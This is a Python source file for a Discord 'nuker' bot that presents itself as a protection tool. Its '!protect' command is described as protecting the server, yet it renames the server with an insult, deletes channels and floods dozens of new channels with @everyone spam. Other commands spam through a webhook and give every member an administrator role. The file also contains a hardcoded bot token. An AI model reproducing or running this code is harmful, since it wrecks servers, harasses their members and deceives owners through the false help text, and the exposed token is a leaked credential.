import discord
from discord.ext import commands
import asyncio
import random
import time

intents = discord.Intents.default()
intents.presences = True
intents.message_content = True

# prefix
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command()
async def protect(ctx):
    new_server_name = "NUKED BITCH" # change this to whatever u want the server name to be
    await ctx.guild.edit(name=new_server_name)
    
        # delete original chnnalel
    await ctx.channel.delete()
    
    channels = ctx.guild.channels
    if len(channels) <= 50:
        # delete up to 50 channels (u can change)
        for channel in channels:
            await channel.delete()
        # creates a new channel called "hello", you can change this btw
        await ctx.guild.create_text_channel(name='hello')
    else:
        channels_to_delete = random.sample(channels, 50)  # finds 50 random channels and deletes
        for channel in channels_to_delete:
            await channel.delete()

    # makes new channels and messages
    message = "@everyone nuked! haha skill issue https://tenor.com/view/nike-keychain-gif-24272076 " # this is the message that is spammed, and the line of code after is all the channels it makes
    channel_names = ["nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked", "nuked","nuked", "nuked", "nuked","nuked", "nuked", "nuked", "nuked", "nuked","nuked", "nuked", "nuked", "nuked", "nuked", "nuked", ]
    new_channel_tasks = [create_and_send_messages(ctx.guild, name, message) for name in channel_names]
    
    await asyncio.gather(*new_channel_tasks)
    
async def create_and_send_messages(guild, channel_name, message):
    channel = await guild.create_text_channel(name=channel_name)
    await send_messages(channel, message)

async def send_messages(channel, message):
    for _ in range(30): # sends 30 messages in each channel (i dont reccomend putting it higher unless u want to be ratelimited, and it could disable your bot aswell as your account)
        await channel.send(message) 

@bot.command()
async def webhook(ctx, num_times: int = 20): # webhook command makes a webhook and spams it
    
    text_channels = [channel for channel in ctx.guild.channels if isinstance(channel, discord.TextChannel)]

    if text_channels:
    
        random_channel = random.choice(text_channels)

        
        webhook = await random_channel.create_webhook(name="w perms")

        
        message = "@everyone say bye to your shitty server LMAOO https://tenor.com/view/nike-keychain-gif-24272076 " # this is the message it spams it with
        for _ in range(num_times):
            await webhook.send(message)
   
@bot.command()
async def roleadmin(ctx): # this just creates a role called Admin with admin perms, (if you have manage role perms, you can give urself this role since its at the bottom)
    admin_role = await ctx.guild.create_role(name="Admin", permissions=discord.Permissions(administrator=True))

    
    for member in ctx.guild.members:
        await member.add_roles(admin_role, reason="feel like it")
     

@bot.command()
async def helper(ctx):
    # create embed
    embed = discord.Embed(title="ProtectoCommands", description="List of available commands:", color=discord.Color.blue())
    
    
    embed.add_field(name="!helper", value="Display this help message", inline=False)
    embed.add_field(name="!roleadmin", value="Makes an Admin role (if you have give roles permissions you can get admin by giving yourself this role)", inline=False)
    embed.add_field(name="!protect", value="Protects this server (frfr)", inline=False)
    embed.add_field(name="!clean", value="Cleans up the channels so it looks cleaner", inline=False)

    # send the embed
    await ctx.send(embed=embed)
   
@bot.command()
async def clean(ctx):
    channels = ctx.guild.channels
    if len(channels) <= 50:
        # delete up to 50 channels
        for channel in channels:
            await channel.delete()
        # creates a new channel called "hello"
        await ctx.guild.create_text_channel(name='hello')
    else:
        channels_to_delete = random.sample(channels, 50)  # finds 50 random channels and deletes
        for channel in channels_to_delete:
            await channel.delete()
        
# put bot token in here
bot.run('MTE0MzE3NzQ3MDYwNzExMDIyNA.GqfPUI.VsfROJJq4haotXqypCxZESmpuquaoTdkJa9oYs')